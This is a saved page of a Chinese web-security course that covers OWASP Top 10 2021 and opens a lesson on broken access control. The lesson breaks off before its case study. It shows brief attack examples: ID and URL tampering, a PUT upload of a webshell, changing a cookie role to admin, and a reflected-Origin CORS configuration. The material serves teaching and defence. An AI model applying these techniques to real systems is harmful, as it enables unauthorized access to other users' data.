<!DOCTYPE html>
<!-- saved from url=(0046)https://kaiiiz.github.io/hexo-theme-book-demo/ -->
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
        <link rel="icon" href="/static/favicon.png">
        <title>Web漏洞挖掘实战.html</title>
        <!-- Spectre.css framework -->
        <link rel="stylesheet" href="/static/index.css">
        <!-- theme css & js -->
        <meta name="generator" content="Hexo 4.2.0">
    </head>

<body>

<div class="book-container">

    <script>
        function add_inner() {
            let inner = document.querySelector('.sidebar-toggle-inner')
            inner.classList.add('show')
        }

        function remove_inner() {
            let inner = document.querySelector('.sidebar-toggle-inner')
            inner.classList.remove('show')
        }

        function sidebar_toggle() {
            let sidebar_toggle = document.querySelector('.sidebar-toggle')
            let sidebar = document.querySelector('.book-sidebar')
            let content = document.querySelector('.off-canvas-content')
            if (sidebar_toggle.classList.contains('extend')) { // show
                sidebar_toggle.classList.remove('extend')
                sidebar.classList.remove('hide')
                content.classList.remove('extend')
            } else { // hide
                sidebar_toggle.classList.add('extend')
                sidebar.classList.add('hide')
                content.classList.add('extend')
            }
        }


function open_sidebar() {
    let sidebar = document.querySelector('.book-sidebar')
    let overlay = document.querySelector('.off-canvas-overlay')
    sidebar.classList.add('show')
    overlay.classList.add('show')
}
function hide_canvas() {
    let sidebar = document.querySelector('.book-sidebar')
    let overlay = document.querySelector('.off-canvas-overlay')
    sidebar.classList.remove('show')
    overlay.classList.remove('show')
}

    </script>

    <div class="off-canvas-content">
        <div class="columns">
            <div class="column col-12 col-lg-12">
                <div class="book-navbar">
                    <!-- For Responsive Layout -->
                    <header class="navbar">
                        <section class="navbar-section">
                            <a onclick="open_sidebar()">
                                <i class="icon icon-menu"></i>
                            </a>
                        </section>
                    </header>
                </div>
                <div class="book-content" style="max-width: 960px; margin: 0 auto;
    overflow-x: auto;
    overflow-y: hidden;">
<div class="book-post">
                            
                            <div align="center">因收到Google相关通知，网站将会择期关闭。<a target="_blank" href="https://lumendatabase.org/notices/44265620">相关通知内容</a><hr></div>
                            
                            <p id="tip" align="center"></p>
                            <h1 id="title" data-id="00 导读 解读OWASP Top10 2021" class="title">00 导读 解读OWASP Top10 2021</h1>
                            <div><p>你好，我是王昊天。今天我们来聊一聊安全行业内“知名”清单的前世今生。</p>

<p>2021年，全新的OWASP TOP 10列表发布，相信只要是关注网络安全的同学，不管你是刚刚踏入安全行业不久，还是一名专业的渗透测试工程师，对于这个消息都不会感到陌生。它作为安全行业内的“知名”清单，不管是在系统开发，还是渗透测试中，一直都是Web安全领域的重点关注对象。</p>

<p>我们先来看下它的背景和定位，其重要性也就可见一斑了。</p>

<p>OWASP，致力于帮助企业和机构开发、购买和维护安全可信的应用和API。他是一个非营利性的公益组织，所有与之相关的产品，像是工具、文档、视频和PPT，都是免费开放给所有人的，如果你感兴趣也可以在课后去深入了解。</p>

<p>而 OWASP TOP 10 就是这个组织创立的一个认知型的文档清单，它帮助我们去了解，在目前的技术趋势下，Web业务系统中那些最常见、最高危的十类安全风险和漏洞。安全业内有许多人将OWASP TOP 10作为一种coding或测试的标准，但也因为它只包含了最具影响力的十类安全风险，所以在这些方面其实并不详实，但它依旧可以作为一个好的起点，帮助你走上Web安全的漫漫长路。</p>

<p>这节课我们就把重点聚焦在这份清单上，看看2021年的这份新清单，和2017发布的上一份清单相比，都有哪些安全风险发生了变化，以此进一步理解这些安全风险变化与技术发展之间的关系，并通过这种方式加深你对OWASP TOP 10的认知。</p>

<h2 id="2021年的owasp-top-10清单有哪些变化">2021年的OWASP TOP 10清单有哪些变化？</h2>

<p>我们先来看看这份最新发布的清单和上一份清单相比发生了哪些变化。这种变化从侧面反映了技术架构及安全趋势的演变，对于我们展望技术更新有很大帮助：</p>

<p><img src="assets/c1663a2871904083b4a0416331848fbf.jpg" alt="图片"></p>

<p>从上面这幅图中我们能看到，<strong>有些安全风险的排名有所下降</strong>：</p>

<ol>
<li>曾经的安全风险之王“注入”已经从排位第一下滑到第三；</li>
<li>认证失败诱发的安全风险从第二下降到了第七。</li>
</ol>

<p>这两类曾经风靡一时的安全风险排名都有了较大幅度地降低，其原因主要有两个方面。一方面，目前整个行业安全意识的提高，大大降低了线上运营中业务系统存在高危安全风险的可能性，这一点从行业服务趋势可以看出——大部分公司在Web业务系统上线之前都会经过详细的渗透测试，而这个流程在几年之前还没有这么普遍；另一方面就是第三方安全和认证组件的成熟，降低了认证失败的安全风险。</p>

<p><strong>我们再来看看有哪些排名上升的安全风险：</strong></p>

<ol>
<li>敏感信息泄露以新的风险形式——加密失败出现上升到第二位；</li>
<li>失效的访问控制上升到第一位；</li>
<li>安全误配置从第六位微弱上升到第五位；</li>
<li>存在安全缺陷的以及过时的组件从第九位上升到第六位；</li>
<li>日志记录及监控不足从第十位上升到第九位。</li>
</ol>

<p>这里值得我们展开探讨的是上升幅度较大的三类风险——加密失败、失效的访问控制以及存在安全缺陷的组件，这三类风险从一个侧面显示了目前Web安全开发及测试过程中需要重点关注的风险种类：</p>

<ol>
<li>加密失败及失效的访问控制，这两类安全风险的共性都是非代码层技术性漏洞，无论是使用了不当的编码加密，还是业务逻辑分割不严密，都是传统安全领域扫描器难以发现的风险种类；</li>
<li>存在缺陷的安全组件则是在目前技术多元化趋势下，一个必然出现的安全风险种类。</li>
</ol>

<p><strong>最后再来看看那些新增的安全风险：</strong></p>

<ol>
<li>首先是不安全的设计。与上升的安全风险原因相似，随着自动化安全检测技术的提高，业务系统在设计中自身存在的问题开始更多地成为热点风险；</li>
<li>另外两种新进入TOP 10的风险分别是软件及数据完整性故障和服务端请求伪造。以软件完整性故障来说，它反映了目前一类成长非常迅速的新形态威胁——供应链污染，这种从上游组件开始污染，最终影响到终端客户的攻击，近些年取得了很大程度的发展。</li>
</ol>

<h2 id="这10项安全风险-分别是什么">这10项安全风险，分别是什么？</h2>

<p>接下来我们展开谈一谈十大安全风险，方便你对其中的每一项安全风险有个宏观的认知。而对于每项安全风险更加具体地介绍，如出现的原因、应用的场景以及相应的编码防护手段，我会在后续课程中详细展开。</p>

<p><strong>A01：2021-失效的访问控制</strong></p>

<p>访问控制存在的意义主要是设定了一种边界，使得用户并不能获得在边界之外进行操作的权限。当访问控制失效，通常会导致非授权信息的泄露、越权修改及破坏数据、执行权限外的操作等后果。</p>

<p><strong>A02：2021-加密失败</strong></p>

<p>这项风险在2017年的清单中以“敏感信息泄露”的形式存在，它更多的是一种常见的风险信号，而不是直接导致安全事件发生的根源。因此我们更多的关注点应该放在密码学的失败调用这些方面。在实际的工作场景下，这类失败的调用往往会伴随着数据泄露事件一起发生，而这种结果的出现是谁都不愿看到的。</p>

<p><strong>A03：2021-注入</strong></p>

<p>这项风险在2017年的清单中高居榜首，通常注入问题都以SQL、NoSQLayer、命令注入等形式存在。注入在几年前确实极具威慑性，然而，随着自动化检测技术的发展，企业和机构往往在开发过程中就引入一系列安全工具来增强安全属性，比如在CI/CD中引入SAST以及DAST工具，这就大大降低了出现这类风险的概率，这也是这两年大热的DevSecOps的理念。</p>

<p><strong>A04：2021-不安全的设计</strong></p>

<p>这是2021年新引入的一项安全风险，主要关注设计和业务流程上的风险。事实上，不安全的设计是一个比较宽泛的话题，可能存在于很多风险之中。这里我们指的是在产品设计过程中，通过安全规范的设计以及威胁建模等流程，那些能被我们检测和规避的安全威胁种类。</p>

<p><strong>A05：2021-安全误配置</strong></p>

<p>与2017年清单相比，可以看到这项安全风险的排位有了些许的提升，也许你会觉得从第六名上升到第五名变化不大，但是就像我刚刚讲的——“一叶知秋”，有时候这种微小的变化却体现了宏观的技术发展趋势。随着技术架构向高度“可配置化”软件的迁移，这种风险类别的排位上升倒是并不令人惊讶。</p>

<p><strong>A06：2021-易受攻击和过时的组件</strong></p>

<p>随着技术的蓬勃发展，大部分产品都会不同程度的依赖各种第三方组件；随着系统复杂度的提升和规模的扩大，也会出现组件更新不及时的情况。这些风险可能涉及的资产包括OS、Web中间件、DBMS、API、库等，从这个角度你就可以发现随着企业规模的扩大，在攻击者眼中的攻击点有多么广泛。</p>

<p><strong>A07：2021-识别和认证失败</strong></p>

<p>确认用户的身份、认证过程以及Session管理是预防认证相关风险的关键点，简单来说，这一风险类别可能面临的攻击包括暴力破解、密码喷洒、弱口令、Session管理不当等诸多问题。后续我会详细和你展开讲一讲其中的奥秘，所以现在不要急，我们先将剩余的几个风险看完。</p>

<p><strong>A08：2021-软件和数据完整性故障</strong></p>

<p>作为新出现的一类安全威胁，这一分类主要关注于软件更新、关键数据以及“CI/CD”流水线的完整性校验。用比较直白的语言来说，现在大多数应用都不同程度依赖于外部的插件、库、模块以及第三方源，所有这些外部风险都可以通过一次不安全的“CI/CD”流水线直接引入到应用中；更进一步，应用的自动更新策略已经广泛普及，但是关于更新内容的完整性检测却没有跟上，这就导致软件更新可能直接引入安全风险。</p>

<p><strong>A09：2021-安全日志记录及监控失败</strong></p>

<p>这一分类主要目的是提供更多信息，并且帮助我们去发现、评估及响应出现的入侵事件。为了达到这个目的，完善的安全日志记录以及持续的监控服务就显得尤为重要。虽然说起来简单，但是如何记录不同的事件及API活动记录、管理日志文件该如何存储和维护，这些都是需要我们考虑的问题。</p>

<p><strong>A10：2021-服务端请求伪造</strong></p>

<p>现代Web应用普遍为终端用户提供了更多便捷的功能，这其中就包括获取一个目标的URL资源的功能，也正因为如此，SSRF成为了一种快速攀升的威胁种类。一旦这类风险发生，尽管这些内网系统可能被保护在防火墙或者VPN之后，却很有可能会威胁到Web业务系统后端的内网系统。</p>

<h2 id="如何将owasp-top-10应用到一个安全项目中">如何将OWASP TOP 10应用到一个安全项目中？</h2>

<p>既然你已经了解了OWASP TOP 10，那么我们就要看一看如何将OWASP TOP 10应用到一个安全项目中。虽然OWASP TOP 10的设计初衷并非一个安全项目的检查清单，但是这并不妨碍它成为一个好的安全基线。</p>

<p><img src="assets/62757b5f5f484d9f838b2eb74c0f0968.jpg" alt=""></p>

<p><strong>第一步，认清安全项目的差距和目标。</strong></p>

<p>在启动一个安全项目前，第一步是评估当前我们所处的位置，准确地识别在管理、设计、实现、验证这些过程中，哪些是立即需要去解决的问题而非可以等待的问题。</p>

<p>具有丰富经验的CSO们都有一个深刻的认知，即安全建设是个无底洞，攻防一直是道高一尺魔高一丈的循环。因此在企业发展过程中，如何准确地评估当前安全事务的优先级，并且利用有效资源进行针对性的防御，才是衡量安全技术水平的试剑石。</p>

<p><strong>第二步，为安全开发生命周期做好计划。</strong></p>

<p>“安全开发生命周期”被业内认为是最简单也是最有效的安全方案，这种措施可以在安全团队与开发团队之间构建紧密的合作关系，当然如果本身就是同一个团队的话就更好了。这项计划目的是可以持续地提高、检测、以及替换不安全的组件。虽然这项计划在构建之初看起来需要大量的投入，但它却可以使我们在实际操作中快速启动一个原型，然后随着开发节奏的推进不断集成新的安全工具。</p>

<p>从经验角度来说，在产品或者项目落地之初就引入安全建设方案，往往是最佳选择。正所谓“好的开始是成功的一半”，这样的操作一方面可以培养开发团队的良好编码习惯，另一方面可以在不断迭代中强化安全能力，不会在某一个阶段突然出现大笔的安全开销。</p>

<p><strong>第三步，与开发团队一起实现安全开发过程。</strong></p>

<p>为了保证安全开发过程的顺利进行，我们需要在开发前期获得开发团队的认可，过程中确保他们持续性的参与，开发过程之后让他们更安全快速地交付更多应用。目前我们所期待的安全开发过程应该是覆盖整个企业以及应用安全生态的，而非像过去一样采用单点或者单应用模式。</p>

<p>这里要注意应该将安全能力融入到开发过程当中，而非作为单一测试过程独立存在。</p>

<p><strong>第四步，将过去和未来的应用迁移到当前的安全开发过程中。</strong></p>

<p>当新的安全检测能力集成到安全开发过程后，我们应该通过持续集成（CI）来检测历史代码中是否存在不安全的使用，并通过警告或者拒绝构建的方式来督促改进。通过这样的方式，不仅可以有效防止安全隐患悄悄潜入应用中，也可以减轻未来的安全成本。</p>

<p>从最佳实践角度来说，我们一般还应该为警告或者拒绝构建的原因增加一项链接，使得直接开发人员可以快速找到安全合理的解决方案。</p>

<p><strong>第五步，确保安全开发过程已经集成了OWASP TOP 10。</strong></p>

<p>讲了这么多，终于到最重要的部分了——在实现安全开发过程中，我们究竟需要集成和使用哪些安全能力呢？这里我们要从最重点的安全问题着手，而OWASP TOP 10就给我们了一个很好的参考，比如我们可以：</p>

<ol>
<li>自动检测以及修复有安全隐患的组件；</li>
<li>自动检测代码是否存在注入隐患或者推荐一个更加安全高效的lib来预防注入问题的发生…</li>
</ol>

<p>随着更多安全组件的引入，我们将可以更加高效且安全地开发应用，而安全团队的一项重要的任务就是保证这些安全组件的持续更新和有效性。</p>

<p><strong>第六步，构建一个成熟的安全检测体系。</strong></p>

<p>虽然OWASP TOP 10是非常重要的，但想要构建一个成熟的安全检测体系可不能仅仅止步于此。安全的有效性往往取决于安全建设的最短板，因此，我们需要不断去覆盖更多的安全风险点。我们要做的，首先是从OWASP TOP 10入手，将主流安全风险降到最低，然后开枝散叶引入更丰富的安全体系（包括OWASP TOP 10不包含的安全风险，以及更丰富的自动化检测手段，如DAST等），这样才能构建成熟的安全检测框架。</p>

<h2 id="总结">总结</h2>

<p>这节课我带你学习了2021新发布的OWASP TOP 10清单。你首先了解了这份清单的背景与定位：它在安全领域举足轻重，是安全领域的“风向标”。</p>

<p>接着将它与2017年的版本做了对比，找出了那些下降的、上升的和新增的风险，通过对比我们了解到安全风险随着新技术的发展不断变化，由此分析出加密失败、失效的访问控制和存在安全缺陷的组件是我们需要重点关注的安全风险；随后明确了新清单所包含的内容，即对10项风险的大致介绍，我将它们总结成一张图片放在文章结尾，提供给你参考。</p>

<p>最后，我们通过具体的步骤将知识点回归到实际的工作当中，学习了该如何通过六个步骤将OWASP TOP 10应用到一个安全项目中：首先我们要找好定位，排好优先级，制定好安全开发的生命周期，其次要和开发团队打好配合，将未来和过去的应用迁移过来，在对OWASP TOP 10这些主要的安全问题作出排查之后，最后就是要增补细枝末节的安全问题，逐步完善安全检测体系。</p>

<p>在以后的学习、工作和交流中，相信对于OWASP TOP 10清单的深刻理解可以给你提供更多的帮助。尤其要注意的是，无论学习了多少深层知识，如何将知识简化并且让知识在工作中产生价值才是最重要的。因此我们也探讨了如何以OWASP TOP 10为起点开始安全开发过程。当然，这些内容我希望都是抛砖引玉，目的是激发你更多思考和学习热情，帮助你成为一名优雅的开发工程师或者专业的黑客高手。</p>

<p><img src="assets/2a7b2758a5774da79d67ac7c1a486cc7.jpg" alt="图片"></p>

<h2 id="思考题">思考题</h2>

<p>Q：这节课我们一直在探讨TOP 10，那么你能否找到一些未被列入TOP 10的安全风险种类呢？</p>

<p>期待你的思考，也欢迎你在留言中与我交流，或者转发给你的朋友加入讨论。我们下节课再见！</p>
</div>
                        </div><div class="book-post">
                            
                            <div align="center">因收到Google相关通知，网站将会择期关闭。<a target="_blank" href="https://lumendatabase.org/notices/44265620">相关通知内容</a><hr></div>
                            
                            <p id="tip" align="center"></p>
                            <h1 id="title" data-id="00 开篇词 从黑客的视角找漏洞，从安全的角度优雅coding" class="title">00 开篇词 从黑客的视角找漏洞，从安全的角度优雅coding</h1>
                            <div><p>你好，我是王昊天，欢迎你加入我的专栏，跟我一起开启Web安全的进阶修炼之路。</p>

<p>先来介绍一下我自己。作为螣龙安科的创始人，我目前带领我的团队从事AI攻防对抗的研究工作。螣龙安科从2020年5月初创，在刚刚过去的11月份完成了新一轮千万级的融资。同时我也是《Web 安全攻防实战》视频课的作者。学过视频课的同学，对我就很熟悉了，恭喜你，你已经为这次的实战专栏打下了很好的知识基础；但没学过视频课的同学也不用担心，这门课的门槛只需要你有最基本的代码基础，我会手把手带你实现漏洞挖掘。</p>

<p>我的研究方向主要在Web 安全、移动安全、内网渗透、复杂环境APT对抗、网络安全工具开发、机器学习与攻防对抗结合等领域。现在正在准备一个为安全人员赋能的AI攻防产品，很快会推出社区版，帮助安全方向的同学们更好地积累知识、更高效地工作以及更智能地攻防。</p>

<p>从业十年，这套AI攻防产品一直是我的愿望，这是一条前沿技术的探索之路。在这个过程中，我遇到了很多跨学科技术问题，不断探索和抽象安全的本质，再尝试用机器语言去描述和复原。在不断地尝试和思考中，我总结了许多Web漏洞挖掘和漏洞出现原因的方法经验，非常希望能在这个专栏与你一起分享和交流！</p>

<h2 id="攻防对抗的未来">攻防对抗的未来</h2>

<p>我在早期工作的时候，对安全攻防是纯粹的热爱，但是有一个问题让我困惑了很久：如果走技术路线，如何让职业天花板进一步提高？日常工作中，虽然攻防领域涉及的知识面众多，但几年的时间已经足够对操作系统、网络协议、应用安全、Web渗透等攻防知识有所掌握，再想成长就有一种无法前进的感觉。</p>

<p>在困惑与思考的过程中，我也向许多朋友及前辈请教，终于发现站在更顶层的视角，更容易看清安全人员的成长之路。在攻击与防御的交互式对抗中，一直有一颗核心闪耀在对抗中央——<strong>漏洞</strong>。</p>

<p>如果把攻防对抗比作一场战争，Web渗透、后门技术、横向移动、隧道搭建、权限提升等技术就像摆兵布阵，用战术优势不断攻城略地；那么漏洞在攻防中的作用就像核武器，这是一种在硬件装备上的降维打击。</p>

<p>在Web领域使用框架级漏洞或是主动漏洞挖掘完成Web Server的控制、在渗透测试中使用边界设备RCE进入内网、在鱼叉式钓鱼攻击中通过浏览器漏洞植入后门、在内网中使用永恒之蓝进行横向移动、在服务器通过提权漏洞获取Administrator权限，你会发现在渗透测试之路走到尽头的时候，所有路标都指向了一座新的高山——<strong>漏洞挖掘</strong>。</p>

<h2 id="漏洞挖掘思维">漏洞挖掘思维</h2>

<p>无论你是一名安全工程师，还是一名开发工程师，掌握漏洞挖掘思维以及漏洞利用原理都是非常有帮助的。</p>

<p>我见过的很多技术大牛，他们在自身的技术领域都非常专业，虽然他们可能并没有系统性地学习过安全知识，但是他们仍然能够写出非常安全优雅的代码，对系统可能出现的风险也了然于心，这是从业多年的积淀。我们常说，真正的黑客都是编程大牛，也是一样的道理。</p>

<p>当我们在开发一个系统的时候，其实会遇到很多潜在的安全隐患。以Web应用为例，前端可能会存在XSS、后端可能会发生注入、用户可能会遭遇CSRF、算法上可能发生弱加密、证书验证上可能遭遇中间人攻击，那么为什么平时开发中我们通常没有考虑到这些种种情况呢？因为我们开发中使用的底层语言、应用框架、技术架构都从不同层面帮我们解决了这些问题，这些解决方案的背后是语言开发工程师、框架开发工程师、开源工程师和公司架构师的共同努力，站在巨人的肩膀上前行使得我们不需要掌握庞大的知识体系。</p>

<p>未来你是不是也希望成为这些大牛的一员，写出简洁、优雅、安全的代码呢？我猜你是愿意的。</p>

<p>可能现在你并不具备大牛十年如一日的开发经验，也还没经历过重大的漏洞和安全事件，但这并不妨碍你掌握优雅安全编码的能力以及掌握一线实战漏洞挖掘的能力，这些大牛从时间沉淀中积累的宝贵经验正是在这个专栏中我想和你分享的。</p>

<h2 id="漏洞挖掘很难-我能学得会吗">漏洞挖掘很难，我能学得会吗？</h2>

<p>即使大学时期是网络安全专业的同学，很可能也没有过一线的漏洞挖掘和漏洞修复经验，其实这是安全行业很特殊的一点。这几年来，安全行业高速发展，各类安全知识开始全面爆发，接触安全的同学越来越多，但是缺乏实战经验成为学习者进一步提高技术能力的瓶颈。网络安全作为一门工程学科，需要的不仅是扎实的理论基础，<strong>实战经历</strong>同样不可或缺。</p>

<p>通过学习渗透测试相关的知识，我们可以到一些靶场环境进行学习和测试，但漏洞挖掘和分析就没这么简单了。首先<strong>靶场环境</strong>普遍围绕基础漏洞构建，涉及高端复杂漏洞领域的不多，这就增加了实际体验漏洞的难度；其次漏洞挖掘和分析需要的往往<strong>不是单一知识点</strong>，可能会涉及多个知识体系内的多个点，这就导致我们很容易在跟踪一个漏洞过程中不断深入延展，最后丧失清晰的学习边界，越学越不懂；最后就是<strong>心态</strong>，安全是勇敢者的游戏，因为你的对手方是未知的，通过不断的学习和积累我们可以强化自身能力，通过自身强大的确定性来与对手方的不确定性博弈，这也是漏洞挖掘最难的一关。</p>

<p>经过这几年在漏洞领域的持续学习和分析，我积累了大量漏洞分析的方法和安全开发方案，再回头看自己一步一步从Web渗透走来，更加深刻地理解了安全行业的同学们成长过程中的障碍。</p>

<p>漏洞挖掘与安全开发需要大量的知识储备，但是现在大多的课程、学习资料，往往都是着眼于某一个知识点去解读，分析的重点往往是漏洞的成因和利用方式。但是对于含金量最高的地方——<strong>漏洞挖掘过程以及思考方式</strong>，却没有仔细分解。这就使得我们在学习的过程中，只收获了一个漏洞的利用方式，但是面对主动漏洞挖掘场景以及安全开发时无能为力。</p>

<p>俗话说“授人以鱼不如授人以渔”，但是小孩子才做选择，成年人是我全都要。</p>

<p>所以，这个专栏我将“授人以鱼和渔”，一方面我会带你遨游2021年十大Web领域安全风险，每一类风险都有近年来<strong>新鲜美味的漏洞</strong>供你品尝体验；另一方面，我会从漏洞挖掘的视角，逐一带你经历每一种安全风险的漏洞挖掘过程，让你掌握如雷达一般的<strong>潜在安全漏洞感知能力</strong>。关于知识点和学习过程，你也不用担心，每一个小主题我都会通过生动形象的故事让你快速理解知识点的本质，然后再展开深入探讨。</p>

<h2 id="我们的课程怎么安排">我们的课程怎么安排？</h2>

<p>正好2021年OWASP发布了新的Web领域TOP 10风险种类，那我们本着学习效果最大化的角度，就从这个清单开始。</p>

<p>首先，我会用一讲的时间带领你整体地了解OWASP TOP的背景以及2021与2017年发生了哪些变化，这种宏观的顶层视角可以帮助我们建立一个与技术发展趋势相关的产业级认知，对我们的技术学习方向与未来职业选择都非常有帮助。</p>

<p>然后，开始学习几大主流风险种类，分别是失效的访问控制、加密失败、注入、不安全的设计以及安全配置错误，我们会深入每一个风险种类进行详细展开。</p>

<p>接着，对于剩下的安全风险类别，我们会在安全风险串讲带你逐一深入。</p>

<p>在学完所有这些漏洞的挖掘思想之后，我们会将他们融合在一起，在最后几讲带你构建自己的前沿漏洞挖掘与智能攻防系统。</p>

<p><img src="assets/767db55189ed45cd9daecb434affe289.jpg" alt="图片"></p>

<p>我们的课程就是按照上述逻辑，依次为你讲解最新的Web领域十大风险种类的漏洞挖掘过程及安全开发细节。每节课都配有近几年的新鲜漏洞、PoC或者Exp代码以及搭建好的漏洞环境，让你能够跟着课程<strong>从体验、到使用、到挖掘、再到修复完成整个漏洞链条的学习</strong>。在课程的最后，你也可以使用我构建好的平台，<strong>来打造属于自己的个性化漏洞挖掘&amp;智能攻防系统</strong>。</p>

<p><img src="assets/74a2be8e7b874909b4174eecca63fb2a.jpg" alt="图片"></p>

<h2 id="你能获得什么">你能获得什么？</h2>

<p>通过这个富有趣味性和知识深度的专栏，如果你能够坚持学习完毕，肯定可以得到这些收获：<strong>掌握Web安全领域漏洞挖掘的思维方式，收获对Web安全更深入的理解以及一个属于自己的个性化智能攻防对抗系统</strong>。</p>

<p>我绘制了一幅简化的OWASP TOP 10风险种类知识体系图，这也包含了后面课程涉及到的所有知识点。尽管图中是一些简单的安全术语，随着你的学习历程，你会发现每一个安全术语背后都是设计精巧、精彩纷呈的计算机学科知识。</p>

<p><img src="assets/b4aca890d5c340ba82910feaa60e45dc.jpg" alt=""></p>

<p>由于复合型安全人才是近些年来的稀缺性，如今，任何一家中大型互联网或者相关产业公司都非常重视信息安全建设。安全相关的知识体系，会成为你涨薪和晋升的黑马加分项。无论是对于公司内部业务群的安全建议，还是对你正着手开发的业务系统进行安全架构的提升，都可以让你从团队中脱颖而出。在这样的背景下，这个专栏给你职业生涯带来的成长你甚至在短期内就能明显感受到。</p>

<p>从长期看来，通过这门课的学习，你会明显提升对于可能存在漏洞的代码或者业务的感知力，并且可以学会如何进行安全的代码开发以及构建安全的Web应用。我相信，这对你提升技术理解力以及拓展技术深度和广度是大有裨益的。之后再进行某些功能开发时，就可以很容易具备<strong>安全架构师级别的视角和相应解决问题的思维</strong>。</p>

<p>摆脱“庸俗”的“面向薪资编程”，相信你对于热爱的coding事业仍满怀初心。学习安全，正是不断深入代码本质，掌握全局视角的过程。作为一个工程师，相信我们对于自己的事业都充满热爱与好奇，那么不妨让安全成为我们敲开新世界大门的那块砖。</p>

<p>不知道你在学习安全的道路上有什么有趣的小故事呢？你对安全又有怎样的理解呢？欢迎你在评论区留下你的答案。下节课我们就正式开启正文部分的学习。</p>
</div>
                        </div><div class="book-post">
                            
                            <div align="center">因收到Google相关通知，网站将会择期关闭。<a target="_blank" href="https://lumendatabase.org/notices/44265620">相关通知内容</a><hr></div>
                            
                            <p id="tip" align="center"></p>
                            <h1 id="title" data-id="01 失效的访问控制：攻击者如何获取其他用户信息？" class="title">01 失效的访问控制：攻击者如何获取其他用户信息？</h1>
                            <div><p>你好，我是王昊天。</p>

<p>英文里有一句谚语你一定听说过，“Curiosity killed the cat”，翻译成中文是“好奇害死猫”。这句话是想告诉人们，不要为那些不必要的尝试去冒不可预知的风险，提醒人们不要过分好奇，否则会给自己带来伤害。但是在网络安全和编程领域，这句话却并不正确，因为正是对未知的好奇与探索，我们才能深入底层原理，写出更优雅的代码，构建出更安全的系统。</p>

<p>要知道，当处于对某种事物的属性出现认知空白时，动物往往想要弥补这份空白，是一种的非常本能心理，好奇心也由此产生。可以想象这样一个场景：当你构建了一个崭新的系统出现在用户面前，如果他们对这个系统充满了探索欲，那么这对于你来说无疑是非常愉快的体验。但是作为系统的构建者，你一定希望用户按照预先设定的规则、在预先搭建好的框架下开始他的旅程。而现实往往并非如此……</p>

<ul>
<li>某个脾气暴躁的用户由于没有耐心，直接通过URL跳过了认证界面；</li>
<li>某个健忘的用户由于记不住密码，通过找回登入了别人的账户；</li>
<li>某个好奇的用户由于想玩一下API，意外访问到了其他人的信息；</li>
<li>某个专业的黑客由于心怀不轨，获取了你的管理员账户……</li>
</ul>

<p>你会发现，如果一个系统不存在有效的访问控制，那么这个系统一旦向用户开放使用，你将面临一场“灾难”。</p>

<h2 id="访问控制">访问控制</h2>

<p>那么什么是访问控制呢？<strong>访问控制是一种策略，在这种策略的控制下，用户的操作不能逾越预设好的权限边界。</strong>而访问控制一旦失效通常会导致未认证信息泄露、内部数据篡改、数据删除和越权操作等后果。访问控制失效型问题通常有以下几种类型：</p>

<ol>
<li>系统在实现过程中违背了“最小权限原则” 或 “默认拒绝原则”，在这种情况下用户可以获得一些特殊权限，而这些特殊权限原本只应该授权给特定的用户或角色；</li>
<li>通过修改URL地址、内部程序状态、HTML页面，或者使用Cyber工具修改API请求的方式绕过访问控制；</li>
<li>通过提供唯一ID的方式预览或者修改其他账户信息及数据；</li>
<li>未经过访问控制地通过POST、PUT和DELETE方法访问API；</li>
<li>通常意义上的提权，比如未登录状态下的用户操作，或者常规用户登录状态下的管理员操作；</li>
<li>元数据操纵，比如重放或者修改JWT（JSON Web Token）访问控制令牌，或者通过操纵Cookie的方式进行提权；</li>
<li>CORS误配置，可以导致来自未认证源的API访问。</li>
</ol>

<p><strong>这里我们首先来看几种简单攻击场景。</strong></p>

<ol>
<li>这个应用在SQL调用中直接使用了未经验证的数据，并利用该数据进行信息查询：</li>
</ol>

<pre><code class="language-java hljs">pstmt.setString(<span class="hljs-number">1</span>, request.getParameter(<span class="hljs-string">"acct"</span>));
<span class="hljs-type">ResultSet</span> <span class="hljs-variable">results</span> <span class="hljs-operator">=</span> pstmt.executeQuery();
</code></pre>

<p>对于一个攻击者而言，只需要简单地在浏览器地址栏中修改acct参数，即可对SQL语句进行操纵，而在未经验证的情况下，该攻击者可以访问到其他账户的信息。</p>

<pre><code class="language-xml hljs">https://example.com/app/accountInfo?acct=notmyacct
</code></pre>

<ol>
<li>一个攻击者可以很轻松地修改URL地址，尝试去访问他的目标链接，比如这里攻击者试图通过URL地址修改直接访问admin页面：</li>
</ol>

<pre><code class="language-xml hljs">https://example.com/app/getappInfo
https://example.com/app/admin_getappInfo
</code></pre>

<p>如果攻击者成功访问了第二个链接，那么说明系统在权限设计和访问控制上就是存在问题的。</p>

<ol>
<li>由于实现过程中未对用户访问参数设置边界，导致了很多越权问题的发生：</li>
</ol>

<pre><code class="language-javascript hljs"><span class="hljs-attr">https</span>:<span class="hljs-comment">//example.com/order/?order_id=2021102617429999</span>
</code></pre>

<p>攻击者可以尝试修改上述API接口中的order_id参数，使其在程序接口上的输入合法，但是对于用户而言却是越权行为。</p>

<ol>
<li>HTTP PUT方法最早目的用于文件管理操作，可以对网站服务器中的文件实现更改删除的更新操作，该方法往往可以导致各种文件上传漏洞，造成严重的网站攻击事件：</li>
</ol>

<pre><code class="language-javascript hljs">put /root/<span class="hljs-title class_">Desktop</span>/shell.<span class="hljs-property">php</span>
</code></pre>

<p>上述代码在支持PUT方法的环境中，上传Webshell进行提权；在实际运用中，若必须启用该方法，则需要对该方法涉及文件资源做好严格的访问权限控制。</p>

<ol>
<li>Web应用将身份认证结果直接存储在Cookie中，并未施加额外的保护措施：</li>
</ol>

<pre><code class="language-javascript hljs"><span class="hljs-title class_">Cookie</span>: role=user --&gt; <span class="hljs-title class_">Cookie</span>: role=admin
</code></pre>

<p>通过在Web前端拦截Cookie，并进行Cookie内容修改即可提权。</p>

<ol>
<li>有些开发者为了方便，直接在Access-Control-Allow-Origin中反射请求的Origin值：</li>
</ol>

<pre><code class="language-javascript hljs">add_header <span class="hljs-string">"Access-Control-Allow-Origin"</span> $http_origin;
add_header “<span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Credentials</span>” “<span class="hljs-literal">true</span>”;
</code></pre>

<p>这是一个错误的Nginx配置示例，这样的配置意味着信任任何网站，攻击者网站可以直接跨域读取其资源内容，窃取隐私数据。</p>

<h2 id="案例实战">案例实战</h2>

<p>通过刚才几个简单的场景，相信你对访问控制已经有了一个初步的认知。接下来我们再来看一个更为复杂的攻击场景。</p>

